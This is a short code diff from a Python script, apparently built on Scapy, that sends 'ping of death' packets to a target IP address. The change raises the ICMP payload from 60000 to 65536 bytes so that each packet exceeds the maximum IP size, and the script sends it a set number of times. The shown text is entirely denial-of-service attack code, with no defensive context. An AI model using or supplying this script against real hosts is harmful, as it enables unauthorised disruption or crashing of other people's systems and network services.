@@ -36,7 +36,7 @@ def main(destination_ip, nbr_ping):
         nbr_ping (int): Number of ping packets
     """
     MESSAGE = "P"
-    pingOFDeath = IP(dst=destination_ip)/ICMP()/(MESSAGE * 60000)
+    pingOFDeath = IP(dst=destination_ip)/ICMP()/(MESSAGE * 65536)
     send(nbr_ping * pingOFDeath)
 
 # Entry point
